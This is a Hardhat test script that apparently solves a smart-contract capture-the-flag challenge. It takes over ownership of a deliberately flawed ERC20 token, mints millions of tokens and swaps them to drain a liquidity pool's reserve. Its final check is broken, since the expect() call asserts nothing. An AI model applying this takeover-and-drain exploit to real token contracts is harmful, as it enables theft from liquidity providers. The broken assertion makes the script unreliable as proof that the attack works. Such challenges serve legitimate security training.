const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const fs = require('fs');


let wmel_contract = 0;
let kwike_factory_contract = 0;
let kwike_router_contract = 0;


async function deploy(contractName, args = []) {
  const contractFactory = await ethers.getContractFactory(contractName);

  const contract = await contractFactory.deploy(...args);
  await contract.deployed();

  return contract;
}

async function deployAll() {
  console.log("[+] Deploying contracts !");

  wmel_contract = await deploy("WMEL");
  kwike_factory_contract = await deploy("KwikEFactory", ["0x9FcF309dC7c97343328d03c1D834d0147076076c"]);
  kwike_router_contract = await deploy("KwikERouter", [kwike_factory_contract.address, wmel_contract.address]);

}

async function depositAs(as, val) {

  let overrides = {
      value: val
  };

  let res = await wmel_contract.deposit(overrides);


  return res;
}

async function do_a_swap(amount_in, slipp, path) {

  let min_tokens = await kwike_router_contract.getAmountsOut(amount_in, path);


  let slippage = ethers.BigNumber.from(slipp).mul(100);
  let val1 = min_tokens[1];
  let min_slippage = val1.mul(slippage).div(ethers.BigNumber.from(10000))
  let res = 0;
  try {
      res = await kwike_router_contract.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount_in, min_slippage, [path[0], path[1]], "0x9FcF309dC7c97343328d03c1D834d0147076076c", Math.floor(Date.now() / 1000) + 60 * 10);
      await res.wait();
  } catch (error) {
      console.log("ERROR ON SWAP", error);
      return;
  }

  return res;
}


function getPercentageOfBigNumber(bigNumber, floatPercentage) {
  if (!(bigNumber instanceof ethers.BigNumber) || typeof floatPercentage !== 'number') {
      throw new Error('Invalid input: first parameter must be a BigNumber and second parameter must be a number');
  }

  // Ensure the float percentage is within range (0 <= floatPercentage <= 100)
  if (floatPercentage < 0 || floatPercentage > 100) {
      throw new Error('Invalid input: float percentage must be between 0 and 100');
  }

  // Calculate the percentage
  const scaleFactor = ethers.BigNumber.from(10).pow(18); // 1 ether
  const percentage = ethers.BigNumber.from(Math.round(floatPercentage * 1e4)).mul(scaleFactor).div(1e4 * 100);
  const result = bigNumber.mul(percentage).div(scaleFactor);

  return result;
}

describe("Challenge 04", function () 
{
  it("Should deploy the contract, create the pair, add liquidity, pwn the ERC20 (have less than 0.5 ETH left)", async function ()
  {
    let [owner] = await ethers.getSigners();
    await deployAll();
    const challenge02 = await ethers.getContractFactory("hero2304");
    const challenge02_contract = await challenge02.deploy();
    await challenge02_contract.deployed();

    console.log("Contract deployed to ", challenge02_contract.address);


    let tx0 = await depositAs(0x0, ethers.utils.parseEther("25.0"))

    await tx0.wait();

    let pair_create = await kwike_factory_contract.createPair(wmel_contract.address, challenge02_contract.address);
    await pair_create.wait();


    let liq_add = await kwike_router_contract.addLiquidity(
      wmel_contract.address,
      challenge02_contract.address,
      ethers.utils.parseUnits("20.0", 18), ethers.utils.parseUnits("1000000", 18), ethers.utils.parseUnits("20", 18), ethers.utils.parseUnits("1000000", 18),
      challenge02_contract.address,
      Math.floor(Date.now() / 1000) + 60 * 10);

    await liq_add.wait();

    
    let pair_addr = await kwike_factory_contract.getPair(wmel_contract.address, challenge02_contract.address)

  
    /*
     * Attach to pair
     */
    const KwikEPair = await ethers.getContractFactory("KwikEPair");
    KwikEPairContract = KwikEPair.attach(pair_addr);


    let res = await KwikEPairContract.getReserves();
    
    res = await challenge02_contract.renounceOwnership();

    await res.wait();

    res = await challenge02_contract.transferOwnership(owner.address);

    await res.wait();

    let ubal = await challenge02_contract.getBalanceOf("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266");
  
    let perc = await getPercentageOfBigNumber(ubal, 90);

    let req = await challenge02_contract.mint(ethers.utils.parseEther("9000000"));

    await req.wait();

    ubal = await challenge02_contract.getBalanceOf("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266");

    req = await do_a_swap(ubal, 90, [challenge02_contract.address, wmel_contract.address])

    await req.wait();

    res = await KwikEPairContract.getReserves();

    expect(res[1].lt(ethers.utils.parseEther("0.5")));

  });
});
